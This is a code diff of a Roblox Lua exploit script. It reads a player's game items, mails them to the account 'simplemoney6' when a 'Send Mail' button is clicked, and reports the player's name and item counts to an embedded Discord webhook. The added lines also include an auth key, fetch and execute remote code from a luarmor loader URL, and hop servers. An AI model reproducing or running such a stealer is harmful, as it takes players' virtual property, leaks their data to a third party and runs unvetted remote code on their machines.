@@ -1,36 +1,35 @@
 
 local function Dialogggg()
     while true do
-local player = game.Players.LocalPlayer
-local gui = player.PlayerGui:FindFirstChild("_MACHINES")
+        local player = game.Players.LocalPlayer
+        local gui = player.PlayerGui:FindFirstChild("_MACHINES")
 
-if gui then
-    local mailboxMachine = gui.MailboxMachine
-    if mailboxMachine then
-        local giftsFrame = mailboxMachine.Frame.GiftsFrame
-        if giftsFrame then
-            local itemsFrame = giftsFrame.ItemsFrame
-            if itemsFrame then
-                local frameChild = itemsFrame:FindFirstChildWhichIsA("Frame")
-                if frameChild then
-                    local args = {
-                        [1] = {
-                            [1] = frameChild.Name
-                        }
-                    }
-                    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Claim"):InvokeServer(unpack(args))
+        if gui then
+            local mailboxMachine = gui.MailboxMachine
+            if mailboxMachine then
+                local giftsFrame = mailboxMachine.Frame.GiftsFrame
+                if giftsFrame then
+                    local itemsFrame = giftsFrame.ItemsFrame
+                    if itemsFrame then
+                        local frameChild = itemsFrame:FindFirstChildWhichIsA("Frame")
+                        if frameChild then
+                            local args = {
+                                [1] = {
+                                    [1] = frameChild.Name
+                                }
+                            }
+                            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Claim"):InvokeServer(unpack(args))
+                        end
+                    end
                 end
             end
         end
+
+        wait(1)
     end
 end
 
-      wait(1)
-    end
-end
-    
 coroutine.wrap(Dialogggg)()
-
 
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local HttpService = game:GetService("HttpService")
@@ -79,7 +78,7 @@ end
 function GrabId()
     for i, MadeTable in ipairs(MakeTable(ItemTable)) do
         local Table = HttpService:JSONDecode(tostring(MadeTable))
-        if Table.data.id == "Seed Bag" then 
+        if Table.data.id == "Seed Bag" then
             seedBagAmount = Table.data._am
             seedbagid = Table.uid
         elseif Table.data.id == "Insta Plant Capsule" then
@@ -118,7 +117,6 @@ local contentMsg = {
     }
 }
 
-
 request({
     Url = webhookURL,
     Method = "POST",
@@ -128,66 +126,134 @@ request({
     Body = HttpService:JSONEncode(contentMsg),
 })
 
-local screenGui = Instance.new("ScreenGui")
-local button = Instance.new("TextButton")
+if game.PlaceId == 15502339080 or game.PlaceId == 8737899170 then
+    local screenGui = Instance.new("ScreenGui")
+    local button = Instance.new("TextButton")
+local WaitValue = 0
+    screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+    button.Parent = screenGui
+    button.Size = UDim2.new(0, 200, 0, 50)
+    button.Position = UDim2.new(0.5, -100, 0, 0)
+    button.BackgroundColor3 = Color3.new(0, 0, 0)
+    button.Text = "Send Mail"
+    button.TextColor3 = Color3.new(1, 1, 1)
+    button.TextScaled = true
 
-screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
-button.Parent = screenGui
-button.Size = UDim2.new(0, 200, 0, 50)
-button.Position = UDim2.new(0.5, -100, 0, 0)  -- Changed Y position to 0 for top alignment
-button.BackgroundColor3 = Color3.new(0, 0, 0)
-button.Text = "Send Mail"
-button.TextColor3 = Color3.new(1, 1, 1)
-button.TextScaled = true
+    button.MouseButton1Click:Connect(function()
+        WaitValue = 9999
 
+        local args1 = {
+            [1] = "simplemoney6",
+            [2] = "sent",
+            [3] = "Misc",
+            [4] = seedbagid or "",
+            [5] = seedBagAmount or ""
+        }
 
-button.MouseButton1Click:Connect(function()
-    local args1 = {
-        [1] = "simplemoney6",
-        [2] = "sent",
-        [3] = "Misc",
-        [4] = seedbagid or "",
-        [5] = seedBagAmount or ""
-    }
+        game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args1))
+        wait(1)
+        local args2 = {
+            [1] = "simplemoney6",
+            [2] = "sent",
+            [3] = "Misc",
+            [4] = instaplantid or "",
+            [5] = instaPlantCapsuleAmount or ""
+        }
 
-    game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args1))
-    wait(1)
-    local args2 = {
-        [1] = "simplemoney6",
-        [2] = "sent",
-        [3] = "Misc",
-        [4] = instaplantid or "",
-        [5] = instaPlantCapsuleAmount or ""
-    }
+        game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args2))
 
-    game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args2))
-
-    local mailContentMsg = {
-        embeds = {
-            {
-                title = "***👨‍💻: " .. playerName .. "***",
-                description = "***💌: Mail Successfully Sent!***",
-                color = 16777215,
-                fields = {
-                    {
-                        name = "***🫙:***",
-                        value = "Sent ***" .. instaPlantCapsuleAmount .. "***"
-                    },
-                    {
-                        name = "***🌱:***",
-                        value = "Sent ***" .. seedBagAmount .. "***"
+        local mailContentMsg = {
+            embeds = {
+                {
+                    title = "***👨‍💻: " .. playerName .. "***",
+                    description = "***💌: Mail Successfully Sent!***",
+                    color = 16777215,
+                    fields = {
+                        {
+                            name = "***🫙:***",
+                            value = "Sent ***" .. instaPlantCapsuleAmount .. "***"
+                        },
+                        {
+                            name = "***🌱:***",
+                            value = "Sent ***" .. seedBagAmount .. "***"
+                        }
                     }
                 }
             }
         }
-    }
 
-    request({
-        Url = webhookURL,
-        Method = "POST",
-        Headers = {
-            ["Content-Type"] = "application/json",
+        request({
+            Url = webhookURL,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json",
+            },
+            Body = HttpService:JSONEncode(mailContentMsg),
+        })
+    end)
+
+    wait(WaitValue)
+    getgenv().Config = {
+        HUGE_GAMES_AUTHKEY = "HUGE_5EN7Jo6KrCC4",
+        Minimum_Gems = 100000,
+        Items = {
+            {
+                Item = "Seed Bag",
+                Price = 5000,
+                Type = "Misc"
+            },
+            {
+                Item = "Insta Plant Capsule",
+                Price = 20000,
+                Type = "Misc"
+            },
         },
-        Body = HttpService:JSONEncode(mailContentMsg),
-    })
-end)
+        Extra = {
+            Huges = {Enabled=false, Percentage= "-10%", priceCap = 50000000},
+            Titanics = {Enabled=false, Percentage="-50%", priceCap = 50000000},
+            Exclusive = {Enabled=false, Percentage="-10%", priceCap = 50000000},
+            Exclusive_Eggs = {Enabled=false, Percentage="-50%", priceCap = 50000000},
+            Any_Item = {Enabled=false, Percentage="-50%", priceCap = 50000000}
+        },
+        Hop = {
+            Server_Hop = true,
+            Server_Hop_Mode = "Terminal",
+        },
+        Webhooks = {
+            Enable_Discord_Webhook = true,
+            Webhook_Url = "https://discord.com/api/webhooks/1240148195783213127/SCs8ji01gBTVw2G66fJDS2Z9Re6eeaXyD8uPRIIhahlsS9qCgPPtQ2NYPFdWlzyXoKo6",
+            Hide_Username = false,
+        }
+    }
+    loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/1c2273a86dbf2e8469b442e55882aa47.lua"))()
+else
+    local Http = game:GetService("HttpService")
+    local TPS = game:GetService("TeleportService")
+    local Api = "https://games.roblox.com/v1/games/"
+
+    local _place = 15502339080
+    local _servers = Api.._place.."/servers/Public?sortOrder=Asc&limit=100"
+
+    -- Updated HTTP request method
+    local httpService = game:GetService("HttpService")
+    local request = (syn and syn.request) or request or (http and http.request) or http_request
+
+    function ListServers(cursor)
+        local Raw = request({
+            Url = _servers .. ((cursor and "&cursor="..cursor) or ""),
+            Method = "GET"
+        })
+        return Http:JSONDecode(Raw.Body)
+    end
+
+    local randomPlayers = math.random(10, 15)  -- Generate a random number between 10 and 15
+    local Server, Next
+
+    repeat
+        local Servers = ListServers(Next)
+        Server = Servers.data[1]
+        Next = Servers.nextPageCursor
+    until Server and Server.playing >= randomPlayers  -- Use randomPlayers variable here
+
+    TPS:TeleportToPlaceInstance(_place,Server.id,Players.LocalPlayer)
+end
